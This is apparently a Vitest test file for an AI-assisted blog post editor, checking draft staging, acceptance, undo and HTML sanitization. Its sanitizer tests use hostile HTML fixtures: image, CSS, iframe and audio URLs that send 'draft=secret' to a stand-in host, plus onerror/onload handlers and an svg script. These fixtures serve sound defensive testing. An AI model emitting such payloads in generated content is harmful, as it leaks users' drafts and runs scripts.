import { createPinia, setActivePinia } from 'pinia'
import { beforeEach, describe, expect, it, vi } from 'vitest'
import { ref } from 'vue'
import { countMissingWritingMedia, sanitizeWritingHtml, sanitizeWritingPreview, useWritingReview, useWritingUndo } from '@/services/writingReview'
import { usePostEditor } from '@/composables/usePostEditor'
import { useTagStore } from '@/stores/tag'

vi.mock('vue-router', () => ({ useRoute: () => ({ query: {} }), useRouter: () => ({ push: vi.fn(), back: vi.fn() }) }))

beforeEach(() => { setActivePinia(createPinia()); localStorage.clear() })

describe('写作暂存与整轮采纳', () => {
  it('多次正文和结构化更新不触碰原稿，明确采纳后可撤销回完整长文', () => {
    const editor = usePostEditor()
    const original = `<p>${'完整长文'.repeat(3000)}</p><p>不可丢失的尾部</p>`
    editor.form.value.title = '原始标题'
    editor.form.value.content = original
    const apply = vi.fn((update, baseline) => editor.handleFieldUpdate(update, baseline))
    const review = useWritingReview(() => editor.adminDraftSnapshot.value, apply)
    review.begin()
    review.stage({ title: '新标题', contentHtml: '<p>生成中</p>' })
    review.stage({ contentHtml: '<p>生成完成</p>' })
    review.apply()
    expect(editor.form.value.content).toBe(original)
    expect(editor.form.value.title).toBe('原始标题')
    expect(apply).not.toHaveBeenCalled()
    review.complete()
    expect(editor.form.value.content).toBe(original)
    review.apply()
    review.apply()
    expect(apply).toHaveBeenCalledTimes(1)
    expect(editor.form.value.content).toBe('<p>生成完成</p>')
    editor.undoAiRound()
    expect(editor.form.value.content).toBe(original)
    expect(editor.form.value.title).toBe('原始标题')
  })

  it('报错、截断或取消后，即使后续误到complete也不能应用', () => {
    const apply = vi.fn()
    const review = useWritingReview(() => ({ content: '原稿' }), apply)
    review.begin()
    review.stage({ contentHtml: '<p>部分输出</p>' })
    review.fail()
    review.complete()
    review.apply()
    expect(review.canApply.value).toBe(false)
    expect(apply).not.toHaveBeenCalled()
  })

  it('发送后修改正文或切换文章会阻止旧结果覆盖，原始快照不跟随表单变动', () => {
    let draft = { postId: 1, content: '原稿', tagIds: [1] }
    const apply = vi.fn()
    const review = useWritingReview(() => draft, apply)
    const original = review.begin()
    draft.tagIds.push(2)
    draft.content = '用户继续编辑'
    review.stage({ contentHtml: '<p>生成结果</p>' })
    review.complete()
    review.apply()
    expect(original).toEqual({ postId: 1, content: '原稿', tagIds: [1] })
    expect(review.conflict.value).toBe(true)
    expect(apply).not.toHaveBeenCalled()
    draft = { postId: 2, content: '原稿', tagIds: [1] }
    expect(review.canApply.value).toBe(false)
  })

  it('明确的空摘要和空标签列表可采纳清空，并整轮恢复原值', () => {
    const tag = { id: 1, name: 'Vue', postCount: 1 }
    useTagStore().tags = [tag]
    const editor = usePostEditor()
    editor.form.value.summary = '原摘要'
    editor.selectedTags.value = [tag]
    const review = useWritingReview(() => editor.adminDraftSnapshot.value, (update, original) => editor.handleFieldUpdate(update, original))
    review.begin()
    review.stage({ summary: '', tagIds: [] })
    review.complete(); review.apply()
    expect(editor.form.value.summary).toBe('')
    expect(editor.selectedTags.value).toEqual([])
    editor.undoAiRound()
    expect(editor.form.value.summary).toBe('原摘要')
    expect(editor.selectedTags.value).toEqual([tag])
  })

  it('整轮撤销只恢复AI改动字段，保留采纳后手改的封面、状态和摘要', () => {
    const editor = usePostEditor()
    editor.form.value.title = '原标题'
    editor.form.value.content = '<p>原正文</p>'
    editor.form.value.coverImage = '/uploads/old.png'
    editor.form.value.status = 'draft'
    editor.handleFieldUpdate({ title: 'AI标题', contentHtml: '<p>AI正文</p>' })
    editor.form.value.coverImage = '/uploads/manual.png'
    editor.form.value.thumbnail = '/uploads/manual-small.png'
    editor.form.value.status = 'published'
    editor.form.value.summary = '手动补充摘要'
    editor.undoAiRound()
    expect(editor.form.value).toMatchObject({ title: '原标题', content: '<p>原正文</p>',
      coverImage: '/uploads/manual.png', thumbnail: '/uploads/manual-small.png', status: 'published', summary: '手动补充摘要' })
  })

  it('两个编辑器共用的撤销状态在A到B以及重新新建时失效', () => {
    const postId = ref<number | null>(1)
    const restore = vi.fn()
    const clear = vi.fn()
    const undo = useWritingUndo(() => postId.value, restore, clear)
    undo.record({ postId: 1 }, [{ field: 'content', oldValue: 'A原稿' }])
    postId.value = 2
    undo.undoRound()
    expect(restore).not.toHaveBeenCalled()
    expect(undo.entries.value).toEqual([])
    // 晚到的A采纳也不能为B建立撤销项。
    undo.record({ postId: 1 }, [{ field: 'content', oldValue: 'A原稿' }])
    expect(undo.entries.value).toEqual([])
    postId.value = null
    undo.record({ postId: null }, [{ field: 'content', oldValue: '上一份新稿' }])
    undo.reset()
    undo.undoRound()
    expect(restore).not.toHaveBeenCalled()
    expect(clear).toHaveBeenCalled()
  })

  it('Web切换文章清掉旧撤销与建议，单字段撤销清对应分类标签建议', () => {
    const editor = usePostEditor()
    editor.editingPostId.value = 1
    editor.form.value.title = 'A原标题'
    editor.handleFieldUpdate({ title: 'A修改', suggestedCategoryName: 'AI分类', suggestedTagNames: ['AI标签'] })
    editor.undoField('categoryId')
    expect(editor.aiSuggestedCategoryName.value).toBe('')
    expect(editor.aiSuggestedTagNames.value).toEqual(['AI标签'])
    editor.undoField('tagIds')
    expect(editor.aiSuggestedTagNames.value).toEqual([])
    editor.editingPostId.value = 2
    editor.form.value.title = 'B原标题'
    editor.undoAiRound()
    expect(editor.form.value.title).toBe('B原标题')
    expect(editor.undoStack.value).toEqual([])
  })

  it('预览移除远程图片、srcset、编码CSS和其他自动资源，只保留点击链接', () => {
    const unsafe = `<p style="background-image:&#117;rl(https://exfil.invalid/css?draft=secret)">正文</p>
      <img src="https://exfil.invalid/image?draft=secret" srcset="https://exfil.invalid/large 2x">
      <style>@import url(https://exfil.invalid/style);</style><link rel="prefetch" href="https://exfil.invalid/prefetch">
      <svg><image href="https://exfil.invalid/svg"></image></svg><video poster="https://exfil.invalid/poster"></video>
      <template><img src="https://exfil.invalid/nested"></template><noscript><img src="https://exfil.invalid/fallback"></noscript>
      <a href="https://reference.invalid/article" ping="https://exfil.invalid/ping">参考</a>`
    const safe = sanitizeWritingPreview(unsafe)
    const template = document.createElement('template'); template.innerHTML = safe
    expect(template.content.querySelector('[src],[srcset],[style],[poster],[background],[ping],img,svg,video,link,style,template,noscript')).toBeNull()
    expect(safe).not.toContain('exfil.invalid')
    expect(template.content.querySelector('a')?.getAttribute('href')).toBeNull()
    expect(template.content.querySelector('a')?.getAttribute('data-writing-href')).toBe('https://reference.invalid/article')
    expect(template.content.textContent).toContain('正文')
  })

  it('采纳只保留原稿已有的图片URL，新URL和全部CSS资源移除；请求前图片可完整撤销', () => {
    const original = '<p>原稿</p><img src="/uploads/original.png"><img src="https://existing.invalid/photo.png">'
    const generated = `<p style="background:url(https://exfil.invalid/css)">改稿</p><img src="/uploads/original.png" srcset="https://exfil.invalid/large 2x">
      <img src="https://existing.invalid/photo.png"><img src="https://existing.invalid/photo.png?draft=secret">
      <img src="https://exfil.invalid/new?draft=secret"><iframe src="https://exfil.invalid/frame"></iframe>`
    expect(sanitizeWritingPreview(original)).not.toContain('<img')
    const safe = sanitizeWritingHtml(generated, original)
    const template = document.createElement('template'); template.innerHTML = safe
    expect(Array.from(template.content.querySelectorAll('img')).map(image => image.getAttribute('src'))).toEqual(['/uploads/original.png', 'https://existing.invalid/photo.png'])
    expect(template.content.querySelector('[srcset],iframe')).toBeNull()
    expect(template.content.querySelector('p')?.getAttribute('style') || '').not.toMatch(/url|background-image/i)
    expect(safe).not.toContain('exfil.invalid')
    expect(safe).not.toContain('draft=secret')
    expect(safe).toContain('新图片请手动添加')
    const editor = usePostEditor(); editor.form.value.content = original
    const review = useWritingReview(() => editor.adminDraftSnapshot.value, (update, baseline) => editor.handleFieldUpdate(update, baseline))
    review.begin(); review.stage({ contentHtml: generated }); review.complete(); review.apply()
    expect(editor.form.value.content).toBe(safe)
    editor.undoAiRound()
    expect(editor.form.value.content).toBe(original)
  })

  it('原稿音视频、iframe、SVG和公式润色后保留，安全排版保留，新媒体不加载', () => {
    const media = '<audio controls src="/uploads/original.mp3"></audio>'
      + '<video controls poster="/uploads/poster.png"><source src="/uploads/original.mp4" type="video/mp4"></video>'
      + '<iframe src="https://existing.invalid/embed/1" width="640" height="360" allowfullscreen></iframe>'
      + '<svg viewBox="0 0 10 10"><circle cx="5" cy="5" r="3" fill="red"></circle></svg>'
      + '<math><mi>x</mi><mo>=</mo><mn>2</mn></math>'
    const original = `<p style="text-align: center; color: rgb(1, 2, 3); font-size: 18px;">原稿</p>${media}`
    const generated = `<p style="text-align: center; color: rgb(1, 2, 3); font-size: 18px; background-image:url(https://exfil.invalid/css)">润色</p>${media}`
      + '<audio src="https://exfil.invalid/audio?draft=secret"></audio><iframe src="https://exfil.invalid/frame"></iframe>'
    const safe = sanitizeWritingHtml(generated, original)
    const template = document.createElement('template'); template.innerHTML = safe
    expect(template.content.querySelectorAll('audio,video,iframe,svg,math')).toHaveLength(5)
    expect(template.content.querySelector('audio')?.getAttribute('src')).toBe('/uploads/original.mp3')
    expect(template.content.querySelector('source')?.getAttribute('src')).toBe('/uploads/original.mp4')
    expect(template.content.querySelector('video')?.getAttribute('poster')).toBe('/uploads/poster.png')
    expect(template.content.querySelector('p')?.getAttribute('style')).toContain('text-align: center')
    expect(template.content.querySelector('p')?.getAttribute('style')).toContain('font-size: 18px')
    expect(safe).not.toContain('exfil.invalid')
    expect(sanitizeWritingHtml(safe, original)).toBe(safe)
    expect(countMissingWritingMedia(original, safe)).toBe(0)
    const preview = sanitizeWritingPreview(generated)
    const previewTemplate = document.createElement('template'); previewTemplate.innerHTML = preview
    expect(previewTemplate.content.querySelector('audio,video,iframe,svg,math,[src],[poster]')).toBeNull()
    expect(preview).not.toContain('existing.invalid')
    expect(preview).not.toContain('exfil.invalid')
    expect(countMissingWritingMedia(original, '<p>省略全部媒体</p>')).toBe(5)
    const editor = usePostEditor(); editor.form.value.content = original
    const review = useWritingReview(() => editor.adminDraftSnapshot.value, (update, baseline) => editor.handleFieldUpdate(update, baseline))
    review.begin(); review.stage({ contentHtml: generated }); review.complete(); review.apply()
    expect(editor.form.value.content).toBe(safe)
    editor.undoAiRound()
    expect(editor.form.value.content).toBe(original)
  })

  it('原媒体仍去掉脚本和事件，修改原媒体源或嵌套未知资源不能通过白名单', () => {
    const original = '<video controls src="/uploads/original.mp4" onerror="alert(1)"></video>'
      + '<svg><script>alert(1)</script><circle r="3" onload="alert(1)"></circle></svg>'
    const safe = sanitizeWritingHtml(original, original)
    expect(safe).toContain('/uploads/original.mp4')
    expect(safe).toContain('<circle')
    expect(safe).not.toMatch(/onerror|onload|script|alert/)
    expect(sanitizeWritingHtml(safe, original)).toBe(safe)
    const altered = '<video controls src="https://exfil.invalid/video"></video>'
      + '<svg><image href="https://exfil.invalid/svg"></image></svg>'
    expect(sanitizeWritingHtml(altered, original)).not.toContain('exfil.invalid')
    expect(countMissingWritingMedia(original, altered)).toBe(2)
  })
})
